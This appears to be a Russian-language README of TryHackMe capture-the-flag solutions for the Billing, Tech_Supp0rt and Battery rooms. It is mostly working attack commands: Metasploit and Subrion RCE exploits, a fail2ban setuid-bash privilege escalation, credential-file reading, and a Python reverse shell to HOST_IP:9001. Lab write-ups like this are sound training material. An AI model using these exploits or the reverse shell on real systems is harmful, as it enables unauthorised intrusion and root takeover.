# TryHackMe
Решения задач с TryHackMe

## 1. Billing
Идея - использовать Metasploit для использования уязвимости cve_2023_30258 (запуск shell скрипта через параметры запроса)
```bash
# 1 флаг
nmap -sC -sV -oN MACHINE_IP

sudo apt update && sudo apt install metasploit-framework -y # Установка утилиты для использования уязвимостей

# Настройка и запуск эксплойта уязвимости
use exploit/linux/http/magnusbilling_unauth_rce_cve_2023_30258
set rhosts MACHINE_IP
set lhost HOST_IP
run

# Поиск и получение флага
cd /
search -f user.txt 
cat ./home/magnus/user.txt



# 2 флаг
# для него уже нужны привилегии root, которых у пользователя к которому мы полдключились нет
shell
sudo -l # Просмотр доступных действий пользователю

# У нас есть доступ к запуску fail2ban-client, но нет прав на на просмотр и редактирование ее файлов (/etc/fail2ban)
# Идея - создать копию конфигурационного файла и изменить его и запустить fail2ban-client передав ему имправленный конфигурационный файл

rsync -av /etc/fail2ban/ /tmp/fail2ban/ # Копируем все содержимое /etc/fail2ban

# Меняем конфиги по этой статье: https://juggernaut-sec.com/fail2ban-lpe/

cat > /tmp/script <<EOF
#!/bin/sh
cp /bin/bash /tmp/bash
chmod 755 /tmp/bash
chmod u+s /tmp/bash
EOF
chmod +x /tmp/script

cat > /tmp/fail2ban/action.d/custom-start-command.conf <<EOF
[Definition]
actionstart = /tmp/script
EOF

cat >> /tmp/fail2ban/jail.local <<EOF
[my-custom-jail]
enabled = true
action = custom-start-command
EOF

cat > /tmp/fail2ban/filter.d/my-custom-jail.conf <<EOF
[Definition]
EOF

# Перезапускаем fail2ban-client с новым файлом конфигурации
sudo fail2ban-client -c /tmp/fail2ban/ -v restart

# Получаем привилегии рута
cd tmp
./bash -p

# Получаем ответ
cd /root
cat root.txt
```

## 2. Tech_Supp0rt: 1
Идея - Заюзать CVE-2018-19422 (reverse shell) на серверер скамеров
```bash
nmap -sC -sV -oN MACHINE_IP

# Перебор скрытых директрий
gobuster dir -u http://MACHINE_IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

# Получения списка доступных общих ресурсов на SMB-сервере (windows-совместимый файловый обмен)
smbclient -L MACHINE_IP

# Подключаемся к websvr и достаем оттуда какой-то подозрительный enter.txt
smbclient //10.10.59.1/websvr
ls -l
get enter.txt
exit

# Смотрим че там (а там адрес сайтика, логин и зашифрованный пароль!) 
cat enter.txt

# Дешифруем пароль из base64, получаем Scam2021
# Скамеры используют subrion 4.2.1 (видно в интерфейсе), но там есть уязвимости

# Эксплойтим уязвимость CVE-2018-19422 (reverse shell)
# https://github.com/hev0x/CVE-2018-19422-SubrionCMS-RCE
sudo python3 subrionRCE.py -u http://MACHINE_IP/subrion/panel/ -l admin -p Scam2021

ls /home
nc -lvnp 9001
cat /var/www/html/wordpress/wp-config.php

ssh scamsite@HOST_IP
sudo -l

# iconv можно использовать для чтения файлов
sudo iconv -f 8859_1 -t 8859_1 "/root/root.txt"
```

## 3. Battery
Идея - 
```bash
nmap -sC -sV -oN MACHINE_IP

# На порту 80 видим невероятно крутой сайт с надписью battery и все, ищем для него скрытые директории
gobuster dir -u http://MACHINE_IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .html,.php,.txt

# Получили различные .html и .php файлы, просто копаемся в них, там можно регаться, логиниться, смотреть дашборд с убогим дизайном
# Самым интересным кажется admin.php, но там просто так не залогиниться
# Спустя куча попыток что-то найти в каком то php файле уже не помню были найдены креды с паролем для подключения по ssh пользователя cyber! Там же лежал первй флаг

cat flag.txt

# найти что то еще кроме файла run.py, к которому у пользователя был доступ только на запуск, не получилось
# в такой ситуации файл часто подменяют на файл с таким же именем , но другим содержимым, то есть можно написать в него reverse shell

rm -rf run.py

cat run.py
import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((HOST_IP,9001));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")

# запускаем и получаем права рута!
sudo usr/bin/python3 /home/cyber/run.py

whoami # root

# остается найти флаги
cd /home
cd yash
cat flag2.txt

cd /root/
cat root.txt
```
